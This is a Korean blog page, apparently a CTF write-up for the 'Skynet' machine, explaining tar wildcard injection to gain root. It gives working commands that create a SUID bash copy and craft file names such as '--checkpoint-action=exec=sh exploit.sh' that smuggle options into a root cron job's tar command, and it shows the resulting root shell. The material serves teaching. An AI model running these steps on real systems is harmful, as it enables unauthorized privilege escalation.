---
layout: page
title: Wildcard_Injection
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


`root` 권한으로 실행되는 `backup.sh` 스크립트가 `tar` 명령어와 함께 와일드카드(`*`)를 안전하지 않은 방식으로 사용하기 때문입니다. 셸(Shell)은 `*`를 현재 디렉토리의 모든 파일 및 디렉토리 이름으로 확장(expand)하여 `tar` 명령어에 인수로 전달합니다. 만약 파일 이름이 `-` 또는 `--`로 시작한다면, `tar` 명령어는 이를 파일 이름이 아닌 **옵션**으로 인식하게 됩니다.

`www-data` 사용자는 `/var/www/html` 디렉토리에 파일을 생성할 권한이 있으므로, 이 점을 악용하여 악의적인 파일 이름을 생성하고 `root` 권한으로 원하는 명령을 실행할 수 있습니다.

---

#### 1. 공격 페이로드 스크립트 생성

먼저, `root` 권한으로 실행할 명령이 담긴 셸 스크립트를 `/var/www/html` 디렉토리에 생성합니다. 여기서는 간단하게 `www-data` 사용자에게 `root` 권한을 부여하기 위해 SUID를 설정한 `bash` 셸 복사본을 만드는 예시를 사용하겠습니다.

```bash
cd /var/www/html
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > exploit.sh
chmod +x exploit.sh
```

- `exploit.sh`: `/bin/bash`를 `/tmp/rootbash`로 복사하고, SUID 비트를 설정하여 어떤 사용자든 `root` 권한으로 실행할 수 있게 만드는 스크립트입니다.


#### 2. `tar` 옵션으로 인식될 파일 생성

이제 `tar` 명령어가 옵션으로 인식하도록 특수하게 조작된 이름의 파일들을 생성합니다.


```bash
touch -- "--checkpoint-action=exec=sh exploit.sh"
touch -- "--checkpoint=1"
```

- `--checkpoint=1`: `tar`가 1개의 파일을 처리할 때마다 체크포인트에 도달했음을 알립니다.

- `--checkpoint-action=exec=./exploit.sh`: 체크포인트에 도달했을 때 실행할 동작을 지정합니다. 여기서는 우리가 만든 `exploit.sh` 스크립트를 실행하도록 설정합니다.

- `sh` `파일 이름` 사이에 공백이 있어야 하며, 그렇지 않으면 `tar` 명령을 잘못 읽고(예: `shexploit.sh`) 아무 일도 일어나지 않습니다.

`--`를 앞에 붙이는 이유는 `touch` 명령어가 `-`로 시작하는 파일명을 옵션으로 착각하지 않고 파일 이름으로 올바르게 생성하도록 하기 위함입니다.

#### 3. 대기 및 권한 상승 확인

이제 모든 준비가 끝났습니다. `cron`에 의해 `backup.sh` 스크립트가 `root` 권한으로 실행될 때까지 기다립니다.

스크립트가 실행되면 다음과 같은 과정이 발생합니다.

1. `cd /var/www/html` 실행

2. `tar cf /home/milesdyson/backups/backup.tgz *` 실행

3. `*`가 확장되어 `tar cf ... --checkpoint=1 --checkpoint-action=exec=./exploit.sh exploit.sh` 와 같은 형태로 명령어가 구성됩니다.

4. `tar`는 이 파일들을 백업하려다 `--checkpoint` 옵션을 만나고, 첫 번째 파일을 처리한 후 `--checkpoint-action`에 지정된 `sh exploit.sh`를 **root 권한으로 실행**합니다.


`cron` 작업이 실행된 후, `/tmp` 디렉토리를 확인하고 생성된 SUID 셸을 이용하여 `root` 권한을 획득합니다.


```bash
www-data@skynet:/var/www/html$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1113504 Aug 31 08:00 /tmp/rootbash  # SUID 비트(s)가 설정됨
www-data@skynet:/var/www/html$ /tmp/rootbash -p
rootbash-5.0# id
uid=1002(www-data) gid=1002(www-data) euid=0(root) groups=1002(www-data)
rootbash-5.0# whoami
root
```

- `-p` 옵션: 유효 UID(euid)가 실제 UID(uid)와 다를 때, 권한을 그대로 유지한 채 셸을 실행하기 위해 사용합니다.